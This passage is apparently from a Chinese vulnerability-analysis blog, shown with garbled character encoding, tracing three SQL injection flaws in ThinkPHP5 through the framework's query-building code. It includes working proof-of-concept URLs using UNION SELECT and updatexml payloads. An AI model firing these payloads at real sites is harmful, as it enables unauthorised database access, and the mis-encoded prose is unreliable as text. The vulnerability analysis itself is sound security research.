href="#å½±å“ç‰ˆæœ¬-2" class="headerlink" title="å½±å“ç‰ˆæœ¬"></a>å½±å“ç‰ˆæœ¬</h2><p>ThinkPHP5 å…¨ç‰ˆæœ¬</p><h2 id="æ¼æ´æ¦‚è¿°-2"><a href="#æ¼æ´æ¦‚è¿°-2" class="headerlink" title="æ¼æ´æ¦‚è¿°"></a>æ¼æ´æ¦‚è¿°</h2><p>æœ¬æ¬¡æ¼æ´å­˜åœ¨äº <strong>Mysql</strong> ç±»çš„ <strong>parseWhereItem</strong> æ–¹æ³•ä¸­ã€‚ç”±äºç¨‹åºæ²¡æœ‰å¯¹æ•°æ®è¿›è¡Œå¾ˆå¥½çš„è¿‡æ»¤ï¼Œå°†æ•°æ®æ‹¼æ¥è¿› <strong>SQL</strong> è¯­å¥ï¼Œå¯¼è‡´ <strong>SQLæ³¨å…¥æ¼æ´</strong> çš„äº§ç”Ÿã€‚</p><h2 id="æ¼æ´åˆ†æ-2"><a href="#æ¼æ´åˆ†æ-2" class="headerlink" title="æ¼æ´åˆ†æ"></a>æ¼æ´åˆ†æ</h2><ul><li>MySQL ç›‘æ§</li></ul><blockquote><p>ç›‘æ§ä¸åˆ°ï¼Œä¸çŸ¥é“ä¸ºä»€ä¹ˆã€‚é…ç½®ä¹Ÿæ˜¯æ­£ç¡®çš„ã€‚</p></blockquote><p><code>/application/index/controller/index.php</code></p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200915105308.png" alt="image-20200914220015121"></p><blockquote><p>ç„¶åç”¨æˆ·è¾“å…¥çš„æ•°æ®ä¼šåŸæ ·è¿›å…¥æ¡†æ¶çš„ SQL æŸ¥è¯¢æ–¹æ³•ä¸­ã€‚é¦–å…ˆç¨‹åºå…ˆè°ƒç”¨ Query ç±»çš„ where æ–¹æ³•ï¼Œé€šè¿‡å…¶ parseWhereExp æ–¹æ³•åˆ†ææŸ¥è¯¢è¡¨è¾¾å¼ï¼Œç„¶åå†è¿”å›å¹¶ç»§ç»­è°ƒç”¨ select æ–¹æ³•å‡†å¤‡å¼€å§‹æ„å»º select è¯­å¥ã€‚ï¼ˆè¿™ä¸ªç‚¹å¾—è®°ä½ï¼Œæ¡†æ¶çš„sqlæŸ¥è¯¢æ–¹æ³•å…ˆè¿›å…¥ Query ç±»ï¼‰</p></blockquote><hr><blockquote><p>ç¨‹åºé»˜è®¤è°ƒç”¨ <strong>Request</strong> ç±»çš„ <strong>get</strong> æ–¹æ³•ä¸­ä¼šè°ƒç”¨è¯¥ç±»çš„ <strong>input</strong> æ–¹æ³•ï¼Œä½†æ˜¯è¯¥æ–¹æ³•é»˜è®¤æƒ…å†µä¸‹å¹¶æ²¡æœ‰å¯¹æ•°æ®è¿›è¡Œå¾ˆå¥½çš„è¿‡æ»¤ï¼Œæ‰€ä»¥ç”¨æˆ·è¾“å…¥çš„æ•°æ®ä¼šåŸæ ·è¿›å…¥æ¡†æ¶çš„ <strong>SQL</strong> æŸ¥è¯¢æ–¹æ³•ä¸­ã€‚é¦–å…ˆç¨‹åºå…ˆè°ƒç”¨ <strong>Query</strong> ç±»çš„ <strong>where</strong> æ–¹æ³•ï¼Œé€šè¿‡å…¶ <strong>parseWhereExp</strong> æ–¹æ³•åˆ†ææŸ¥è¯¢è¡¨è¾¾å¼ï¼Œç„¶åå†è¿”å›å¹¶ç»§ç»­è°ƒç”¨ <strong>select</strong> æ–¹æ³•å‡†å¤‡å¼€å§‹æ„å»º <strong>select</strong> è¯­å¥ã€‚</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200915105416.png" alt="image-20200914222945520"></p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200915105701.png" alt="image-20200914224146213"></p><p>æ­¤å¤„è°ƒç”¨<code>$this-&gt;builder</code>çš„<code>select</code>æ–¹æ³•ã€‚è€Œæ­¤å¤„<code>$this-&gt;builder</code> ä¸º<code>think/db/builder/Mysql</code> ç±»ï¼Œç»§æ‰¿äº<code>Builder</code> ç±»ã€‚å› æ­¤è°ƒç”¨çš„æ˜¯<code>Builder</code>ç±»çš„<code>select</code> æ–¹æ³•</p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200915105718.png" alt="image-20200914225616763"></p><p>åœ¨ <strong>select</strong> æ–¹æ³•ä¸­ï¼Œç¨‹åºä¼šå¯¹ <strong>SQL</strong> è¯­å¥æ¨¡æ¿ç”¨å˜é‡å¡«å……ï¼Œå…¶ä¸­ç”¨æ¥å¡«å…… <strong>%WHERE%</strong> çš„å˜é‡ä¸­å­˜åœ¨ç”¨æˆ·è¾“å…¥çš„æ•°æ®ã€‚è·Ÿè¿›è¿™ä¸ª <strong>where</strong> åˆ†æå‡½æ•°ï¼Œä¼šå‘ç°å…¶ä¼šè°ƒç”¨ç”ŸæˆæŸ¥è¯¢æ¡ä»¶ <strong>SQL</strong> è¯­å¥çš„ <strong>buildWhere</strong> å‡½æ•°ã€‚</p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200915105734.png" alt="image-20200914231827114"></p><p>æ­¤å¤„<code>$where</code> ç»è¿‡ <code>buildWhere</code> æ–¹æ³•å¤„ç†åè¿”å›<code>$whereStr</code></p><p><code>parseWhereItem</code> çš„ <code>where</code>  å­å•å…ƒå‡½æ•°æ–¹æ³•è°ƒç”¨ï¼Œå½“æ“ä½œç¬¦ä¸º<code>EXP</code> æ—¶ï¼Œç»è¿‡æ‹¼æ¥å¸¦å…¥SQLæŸ¥è¯¢ï¼Œé€ æˆSQLæ³¨å…¥ã€‚</p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200915105750.png" alt="image-20200914235436560"></p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200915105805.png" alt="image-20200915000616883"></p><p>å®Œæ•´çš„æ–¹æ³•è°ƒç”¨å¦‚ä¸Šå›¾ç»¿è‰²éƒ¨åˆ†ã€‚</p><h2 id="åˆ©ç”¨æ€»ç»“-2"><a href="#åˆ©ç”¨æ€»ç»“-2" class="headerlink" title="åˆ©ç”¨æ€»ç»“"></a>åˆ©ç”¨æ€»ç»“</h2><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200915105825.png" alt="carbon (1)"></p><h2 id="æ¼æ´ä¿®å¤-2"><a href="#æ¼æ´ä¿®å¤-2" class="headerlink" title="æ¼æ´ä¿®å¤"></a>æ¼æ´ä¿®å¤</h2><p>å®˜ç½‘æœªä¿®å¤ã€‚</p><blockquote><p>ç»§æ‰¿ç±»ï¼Œç­‰é¢å‘å¯¹è±¡çš„åŸºæœ¬çŸ¥è¯†å¾ˆé‡è¦ã€‚</p></blockquote><h1 id="SQLæ³¨å…¥å››-select"><a href="#SQLæ³¨å…¥å››-select" class="headerlink" title="SQLæ³¨å…¥å››(select)"></a>SQLæ³¨å…¥å››(select)</h1><p>æ¼æ´å¤ç°ç¯å¢ƒå’Œä¸Šé¢åº”è¯¥æ˜¯å·®ä¸å¤šçš„ã€‚</p><h2 id="POC-3"><a href="#POC-3" class="headerlink" title="POC"></a>POC</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">public&#x2F;index.php&#x2F;index&#x2F;index?username[0]&#x3D;not%20like&amp;username[1][0]&#x3D;%%&amp;username[1][1]&#x3D;233&amp;username[2]&#x3D;)%20union%20select%201,user()%23</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200915125740.png" alt="image-20200915122649716"></p><h2 id="å½±å“ç‰ˆæœ¬-3"><a href="#å½±å“ç‰ˆæœ¬-3" class="headerlink" title="å½±å“ç‰ˆæœ¬"></a>å½±å“ç‰ˆæœ¬</h2><p><strong>ThinkPHP: 5.0.10</strong></p><h2 id="æ¼æ´æ¦‚è¿°-3"><a href="#æ¼æ´æ¦‚è¿°-3" class="headerlink" title="æ¼æ´æ¦‚è¿°"></a>æ¼æ´æ¦‚è¿°</h2><blockquote><p>æœ¬æ¬¡æ¼æ´å­˜åœ¨äº <strong>Mysql</strong> ç±»çš„ <strong>parseWhereItem</strong> æ–¹æ³•ä¸­ã€‚ç”±äºç¨‹åºæ²¡æœ‰å¯¹æ•°æ®è¿›è¡Œå¾ˆå¥½çš„è¿‡æ»¤ï¼Œç›´æ¥å°†æ•°æ®æ‹¼æ¥è¿› <strong>SQL</strong> è¯­å¥ã€‚å†ä¸€ä¸ªï¼Œ <strong>Request</strong> ç±»çš„ <strong>filterValue</strong> æ–¹æ³•æ¼è¿‡æ»¤ <strong>NOT LIKE</strong> å…³é”®å­—ï¼Œæœ€ç»ˆå¯¼è‡´ <strong>SQLæ³¨å…¥æ¼æ´</strong> çš„äº§ç”Ÿ</p></blockquote><p>åœ¨MySQL ä¸­ <code>NOT LIKE</code>  ä¸ºæ¨¡ç³ŠæŸ¥è¯¢ï¼Œä»€ä¹ˆæ˜¯æ¨¡ç³ŠæŸ¥è¯¢å‘¢ï¼Ÿ</p><blockquote><p>mysqlæ¨¡ç³ŠæŸ¥è¯¢likeçš„ç”¨æ³•:</p><p>æŸ¥è¯¢userè¡¨ä¸­å§“åä¸­æœ‰â€œç‹â€å­—çš„ï¼š</p><p>select * from user where name like â€˜%ç‹%â€™</p><p>mysqlæ¨¡ç³ŠæŸ¥è¯¢not likeçš„ç”¨æ³•</p><p>æŸ¥è¯¢userè¡¨ä¸­å§“åä¸­æ²¡æœ‰â€œç‹â€å­—çš„ï¼š</p><p>select * from user where name not like â€˜%ç‹%â€™</p></blockquote><h2 id="æ¼æ´åˆ†æ-3"><a href="#æ¼æ´åˆ†æ-3" class="headerlink" title="æ¼æ´åˆ†æ"></a>æ¼æ´åˆ†æ</h2><p>è¯¥SQLæ³¨å…¥æ¼æ´å½±å“ç‰ˆæœ¬ä¸º <code>5.0.10</code> ï¼Œå› æ­¤å» <code>5.0.11</code> çš„æ›´æ–°è®°å½•ä¸­ï¼Œåˆ™å¯ä»¥æŸ¥çœ‹ç›¸å…³çš„ä¿®å¤æ“ä½œã€‚</p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200915190936.png" alt="image-20200915132004061"></p><p>Commit ï¼š<a href="https://github.com/top-think/framework/commit/f43688a30ce921df1c7cda771620c0fbe1868e7d">https://github.com/top-think/framework/commit/f43688a30ce921df1c7cda771620c0fbe1868e7d</a></p><p>ï¼ˆ æ€¥éœ€å¦‚ä½•å¿«é€Ÿå®šä½åˆ° æŸä¸ªæŒ‡å®šçš„commit è®°å½•çš„æ–¹æ³•ã€‚</p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200915140312.png" alt="image-20200915133611309"></p><p>å¯ä»¥çœ‹åˆ°ï¼Œè¿™é‡Œä¹‹å‰æ˜¯æ²¡æœ‰å°†ç‰¹æ®Šå­—ç¬¦ <code>NOT LIKE</code>   ç»™è¿‡æ»¤æ‰ã€‚</p><hr><p>æ ¹æ®Payloadæ¥åˆ†ææ¼æ´åŸç†ï¼š</p><blockquote><p>ä¸ç®¡ä»¥å“ªç§æ–¹å¼ä¼ é€’æ•°æ®ç»™æœåŠ¡å™¨ï¼Œè¿™äº›æ•°æ®åœ¨ <strong>ThinkPHP</strong> ä¸­éƒ½ä¼šç»è¿‡ <strong>Request</strong> ç±»çš„ <strong>input</strong> æ–¹æ³•</p></blockquote><p>åœ¨<code>input</code> æ–¹æ³•ä¸­ï¼šä¼ å…¥çš„æ•°æ®ä¼šç»è¿‡ filterValueè¿‡æ»¤<code>å’Œ </code>å¼ºåˆ¶ç±»å‹è½¬æ¢,ç„¶åè¿”å›ã€‚</p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200915190852.png"></p><p>è·Ÿè¿›è¯¥æ–¹æ³•ï¼ŒæŸ¥çœ‹æ˜¯å¦‚ä½•å®ç°çš„ã€‚å‘ç°åˆä¼šè°ƒç”¨åˆ°<code>filterExp</code>  æ–¹æ³•ï¼Œ</p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200915190840.png" alt="image-20200915142723291"></p><p>å¯ä»¥çœ‹åˆ°æ²¡æœ‰è¿‡æ»¤<code>NOT LIKE</code></p><blockquote><p>ThinkPHPå¤„ç† <strong>SQL</strong> è¯­å¥çš„æ–¹æ³•ã€‚é¦–å…ˆç¨‹åºå…ˆè°ƒç”¨ <strong>Query</strong> ç±»çš„ <strong>where</strong> æ–¹æ³•ï¼Œé€šè¿‡å…¶ <strong>parseWhereExp</strong> æ–¹æ³•åˆ†ææŸ¥è¯¢è¡¨è¾¾å¼ï¼Œç„¶åå†è¿”å›å¹¶ç»§ç»­è°ƒç”¨ <strong>select</strong> æ–¹æ³•å‡†å¤‡å¼€å§‹æ„å»º <strong>select</strong> è¯­å¥ã€‚</p></blockquote><p>![image-20200915144157181](/Users/m0nk3y/Library/Application Support/typora-user-images/image-20200915144157181.png)</p><p>æ­¤å¤„çš„<code>$this-&gt;builder</code> ä¸º <code>think\db\builder\Mysql</code> ç±»ã€‚è€Œ<code>Mysql</code> ç±»ç»§æ‰¿äº <code>Builder</code>ç±»ï¼Œæ‰€ä»¥ä¼šç»§ç»­è°ƒç”¨åˆ°<code>Builder</code>ç±»çš„<code>select</code>æ–¹æ³•ã€‚è¯¥æ–¹æ³•è°ƒç”¨äº†<code>parseWhere</code>æ–¹æ³•ï¼Œç„¶åè°ƒç”¨äº†<code>buildWhere</code>æ–¹æ³•ï¼Œè¯¥æ–¹æ³•ç»§ç»­è°ƒç”¨äº† <code>parseWhereItem</code> æ–¹æ³•ï¼Œè·Ÿè¿›è¯¥æ–¹æ³•ï¼Œ</p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200915185921.png"></p><p>æ­¤å¤„åˆ° æ“ä½œç¬¦ <code>$exp</code> ä¸º <code>NOT LIKE</code> æˆ– <code>LIKE</code> æ—¶ï¼ŒMySQL çš„é€»è¾‘æ§åˆ¶ç¬¦å¯æ§ã€‚åè¿›è¡Œæ‹¼æ¥è¿”å›å¸¦å…¥SQLè¯­å¥ä¸­æ‰§è¡Œï¼Œå¯¼è‡´äº†SQLæ³¨å…¥æ¼æ´ã€‚</p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200915185938.png" alt="image-20200915151528489"></p><p>æœ€ç»ˆçš„ç»“æœå°±æ˜¯è¿”å›å¸¦æœ‰æ¶æ„çš„SQL Payloadï¼ˆ<code>whereStr</code>ï¼Œçº¢è‰²éƒ¨åˆ†ã€‚</p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200915190030.png" alt="image-20200915184916179"></p><p>æ•´ä¸ªè¿‡ç¨‹çš„æ–¹æ³•è°ƒç”¨æƒ…å†µå¦‚ç»¿è‰²æ¡†èµ·çš„éƒ¨åˆ†ã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(&#96;username&#96; NOT LIKE &#39;%%&#39; ) UNION SELECT 1,USER()# &#96;username&#96; NOT LIKE &#39;233&#39;)</span><br></pre></td></tr></table></figure><h2 id="åˆ©ç”¨æ€»ç»“-3"><a href="#åˆ©ç”¨æ€»ç»“-3" class="headerlink" title="åˆ©ç”¨æ€»ç»“"></a>åˆ©ç”¨æ€»ç»“</h2><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200915185921.png"></p><blockquote><p>ä¸‹å›¾æ¥è‡ªä¸ƒæœˆç«å¸ˆå‚…çš„æ€»ç»“æ–‡ç« é‡Œçš„ã€‚</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200915191318.png" alt="9"></p><h2 id="æ¼æ´ä¿®å¤-3"><a href="#æ¼æ´ä¿®å¤-3" class="headerlink" title="æ¼æ´ä¿®å¤"></a>æ¼æ´ä¿®å¤</h2><p>å¢åŠ è¿‡æ»¤</p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200915140312.png"></p><h1 id="SQLæ³¨å…¥äº”-order-by"><a href="#SQLæ³¨å…¥äº”-order-by" class="headerlink" title="SQLæ³¨å…¥äº”(order by)"></a>SQLæ³¨å…¥äº”(order by)</h1><p>ç¯å¢ƒæ­å»ºä¹Ÿå·®ä¸å¤šï¼Œéœ€è¦æ‰‹åŠ¨å¼€å¯<code>../config/app.php</code> ä¸‹çš„<code>app_debug</code> å’Œ <code>app_trace</code></p><h2 id="POC-4"><a href="#POC-4" class="headerlink" title="POC"></a>POC</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;public&#x2F;index.php&#x2F;index&#x2F;index&#x2F;?orderby[id&#96;|updatexml(1,concat(0x7,user(),0x7e),1)%23]&#x3D;1</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200916002455.png" alt="image-20200915195454500"></p><h2 id="å½±å“ç‰ˆæœ¬-4"><a href="#å½±å“ç‰ˆæœ¬-4" class="headerlink" title="å½±å“ç‰ˆæœ¬"></a>å½±å“ç‰ˆæœ¬</h2><p><strong>5.1.16&lt;=ThinkPHP5&lt;=5.1.22</strong></p><h2 id="æ¼æ´æ¦‚è¿°-4"><a href="#æ¼æ´æ¦‚è¿°-4" class="headerlink" title="æ¼æ´æ¦‚è¿°"></a>æ¼æ´æ¦‚è¿°</h2><p>æœ¬æ¬¡æ¼æ´å­˜åœ¨äº <code>Builder</code> ç±»çš„ <code>parseOrder</code> æ–¹æ³•ä¸­ã€‚ç”±äºç¨‹åºæ²¡æœ‰å¯¹æ•°æ®è¿›è¡Œå¾ˆå¥½çš„è¿‡æ»¤ï¼Œç›´æ¥å°†æ•°æ®æ‹¼æ¥è¿› SQL è¯­å¥ï¼Œæœ€ç»ˆå¯¼è‡´ SQLæ³¨å…¥æ¼æ´ çš„äº§ç”Ÿã€‚</p><h2 id="æ¼æ´åˆ†æ-4"><a href="#æ¼æ´åˆ†æ-4" class="headerlink" title="æ¼æ´åˆ†æ"></a>æ¼æ´åˆ†æ</h2><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200915232420.png" alt="image-20200915201246990"></p><p>![image-20200915202933679](/Users/m0nk3y/Library/Application Support/typora-user-images/image-20200915202933679.png)</p><p>ä»ä¿®æ”¹è®°å½•ä¸­çœ‹åˆ°ï¼Œå¢åŠ äº†ä¸€æ¡ifåˆ¤æ–­è¯­å¥æ¥è¿‡æ»¤<code>$key</code>ä¸­çš„<code>)</code> å’Œ <code>#</code>  ã€‚è¿™ä¸¤ä¸ªç¬¦å·ä¹Ÿæ˜¯åœ¨CTFä¸­å¾€å¾€ä¼šè¿‡æ»¤çš„ç‚¹ã€‚</p><p>æˆ‘ä»¬çš„æ•°æ®éƒ½ä¼šè¿›å…¥åˆ°<code>Request</code> ç±»ä¸­çš„<code>input</code>æ–¹æ³•ï¼Œå¹¶ä¸”ç»è¿‡<code>filterValue</code>æ–¹æ³•çš„è¿‡æ»¤å’Œå¼ºåˆ¶ç±»å‹è½¬æ¢å¹¶è¿”å›<code>$data</code>ã€‚</p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200915232744.png"></p><p>è¿™é‡Œ<code>array_walk_recursive()</code>å‡½æ•°ï¼Œå¯¹æ•°ç»„ä¸­çš„æˆå‘˜é€’å½’è°ƒç”¨<code>filterValue</code> è¿‡æ»¤å‡½æ•°ã€‚</p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200915232803.png" alt="image-20200915205211882"></p><p>ä½†æ˜¯<code>filterValue</code> è¿‡æ»¤å‡½æ•°ï¼Œä¸è¿‡æ»¤æ•°ç»„çš„<code>key</code> ï¼Œ åªè¿‡æ»¤äº†æ•°ç»„çš„<code>value</code> ã€‚</p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200915232824.png"></p><p>ç”¨æˆ·è¾“å…¥çš„æ•°æ®ä¼šåŸæ ·</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?orderby[id&#96;|updatexml(1,concat(0x7,user(),0x7e),1)%23]&#x3D;1</span><br></pre></td></tr></table></figure><p>è¿›å…¥æ¡†æ¶çš„ SQLæŸ¥è¯¢æ–¹æ³•ä¸­ï¼Œè¿›å…¥<code>Query</code>ç±»ï¼Œè¿™æ¬¡æ˜¯é€šè¿‡è°ƒç”¨<code>order</code>æ–¹æ³•ã€‚</p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200915232853.png" alt="image-20200915210341486"></p><p>æ¶æ„Payload æœªç»è¿‡ä»»ä½•è¿‡æ»¤ç›´æ¥ä¼ é€’ç»™<code>options[&#39;order&#39;]</code> ä¸­ã€‚æ¥ç€è°ƒç”¨<code>find()</code>æ–¹æ³•ã€‚</p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200915232946.png" alt="image-20200915210940031"></p><p>æ­¤å¤„<code>$this-&gt;connection</code> æ˜¯<code>think/db/connectior/Mysql</code>ç±» ï¼Œç»§æ‰¿äº<code>Connection</code>ç±»ï¼Œäºæ˜¯æ­¤å¤„ç»§ç»­è°ƒç”¨è¯¥ç±»çš„<code>find()</code>æ–¹æ³•ï¼Œ</p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200915233014.png" alt="image-20200915211715450"></p><p>è¯¥æ–¹æ³•ç»§ç»­è°ƒç”¨äº† <code>$this-&gt;builder</code>, å³<code>think/db/builder/Mysql</code> ç±»çš„<code>select</code> æ–¹æ³•ã€‚è¯¥æ–¹æ³•é€šè¿‡<code>str_replace</code> å‡½æ•°ï¼Œå°†æ•°æ®å¡«å……åˆ°SQLè¯­å¥ä¸­ã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">select</span>(<span class="params">Query $query</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    $options = $query-&gt;getOptions();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> str_replace(</span><br><span class="line">        [<span class="string">&#x27;%TABLE%&#x27;</span>, <span class="string">&#x27;%DISTINCT%&#x27;</span>, <span class="string">&#x27;%FIELD%&#x27;</span>, <span class="string">&#x27;%JOIN%&#x27;</span>, <span class="string">&#x27;%WHERE%&#x27;</span>, <span class="string">&#x27;%GROUP%&#x27;</span>, <span class="string">&#x27;%HAVING%&#x27;</span>, <span class="string">&#x27;%ORDER%&#x27;</span>, <span class="string">&#x27;%LIMIT%&#x27;</span>, <span class="string">&#x27;%UNION%&#x27;</span>, <span class="string">&#x27;%LOCK%&#x27;</span>, <span class="string">&#x27;%COMMENT%&#x27;</span>, <span class="string">&#x27;%FORCE%&#x27;</span>],</span><br><span class="line">        [</span><br><span class="line">            <span class="keyword">$this</span>-&gt;parseTable($query, $options[<span class="string">&#x27;table&#x27;</span>]),</span><br><span class="line">            <span class="keyword">$this</span>-&gt;parseDistinct($query, $options[<span class="string">&#x27;distinct&#x27;</span>]),</span><br><span class="line">            <span class="keyword">$this</span>-&gt;parseField($query, $options[<span class="string">&#x27;field&#x27;</span>]),</span><br><span class="line">            <span class="keyword">$this</span>-&gt;parseJoin($query, $options[<span class="string">&#x27;join&#x27;</span>]),</span><br><span class="line">            <span class="keyword">$this</span>-&gt;parseWhere($query, $options[<span class="string">&#x27;where&#x27;</span>]),</span><br><span class="line">            <span class="keyword">$this</span>-&gt;parseGroup($query, $options[<span class="string">&#x27;group&#x27;</span>]),</span><br><span class="line">            <span class="keyword">$this</span>-&gt;parseHaving($query, $options[<span class="string">&#x27;having&#x27;</span>]),</span><br><span class="line">            <span class="keyword">$this</span>-&gt;parseOrder($query, $options[<span class="string">&#x27;order&#x27;</span>]),</span><br><span class="line">            <span class="keyword">$this</span>-&gt;parseLimit($query, $options[<span class="string">&#x27;limit&#x27;</span>]),</span><br><span class="line">            <span class="keyword">$this</span>-&gt;parseUnion($query, $options[<span class="string">&#x27;union&#x27;</span>]),</span><br><span class="line">            <span class="keyword">$this</span>-&gt;parseLock($query, $options[<span class="string">&#x27;lock&#x27;</span>]),</span><br><span class="line">            <span class="keyword">$this</span>-&gt;parseComment($query, $options[<span class="string">&#x27;comment&#x27;</span>]),</span><br><span class="line">            <span class="keyword">$this</span>-&gt;parseForce($query, $options[<span class="string">&#x27;force&#x27;</span>]),</span><br><span class="line">        ],</span><br><span class="line">        <span class="keyword">$this</span>-&gt;selectSql);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ç„¶åè°ƒç”¨äº†<code>parseOrder</code> æ–¹æ³•ï¼Œè·Ÿè¿›ä¸‹ï¼Œ</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">parseOrder</span>(<span class="params">Query $query, $order</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">empty</span>($order)) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    $array = [];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">foreach</span> ($order <span class="keyword">as</span> $key =&gt; $val) &#123;</span><br><span class="line">        <span class="keyword">if</span> ($val <span class="keyword">instanceof</span> Expression) &#123;</span><br><span class="line">            $array[] = $val-&gt;getValue();</span><br><span class="line">        &#125; <span class="keyword">elseif</span> (is_array($val)) &#123;</span><br><span class="line">            $array[] = <span class="keyword">$this</span>-&gt;parseOrderField($query, $key, $val);</span><br><span class="line">        &#125; <span class="keyword">elseif</span> (<span class="string">&#x27;[rand]&#x27;</span> == $val) &#123;</span><br><span class="line">            $array[] = <span class="keyword">$this</span>-&gt;parseRand($query);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">if</span> (is_numeric($key)) &#123;</span><br><span class="line">                <span class="keyword">list</span>($key, $sort) = explode(<span class="string">&#x27; &#x27;</span>, strpos($val, <span class="string">&#x27; &#x27;</span>) ? $val : $val . <span class="string">&#x27; &#x27;</span>);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                $sort = $val;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            $sort    = strtoupper($sort);</span><br><span class="line">            $sort    = in_array($sort, [<span class="string">&#x27;ASC&#x27;</span>, <span class="string">&#x27;DESC&#x27;</span>], <span class="literal">true</span>) ? <span class="string">&#x27; &#x27;</span> . $sort : <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">            $array[] = <span class="keyword">$this</span>-&gt;parseKey($query, $key, <span class="literal">true</span>) . $sort;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27; ORDER BY &#x27;</span> . implode(<span class="string">&#x27;,&#x27;</span>, $array);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>åœ¨ä¸Šé¢çš„å‡½æ•°ä¸­ï¼Œ<code>$order</code> å³æ˜¯æˆ‘ä»¬è¾“å…¥çš„æ•°æ®ï¼Œç„¶åç»è¿‡äº†<code>parseKey</code> æ–¹æ³•å¤„ç†åè¿”å›ç»™<code>$array</code>ã€‚</p><p>è·Ÿè¿›æŸ¥çœ‹è¯¥æ–¹æ³•çš„å®ç°ã€‚</p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200915233128.png" alt="image-20200915231942203"></p><p>è¯¥æ–¹æ³•åœ¨å˜é‡<code>$key</code> çš„ä¸¤ç«¯æ·»åŠ äº†åå¼•å·è¿›è¡Œæ‹¼æ¥ï¼Œå¹¶ä¸”æ²¡æœ‰ä»»ä½•è¿‡æ»¤ã€‚å†å’Œç²¾å¿ƒæ„é€ å¥½çš„Payload ç»“åˆå</p><p><img 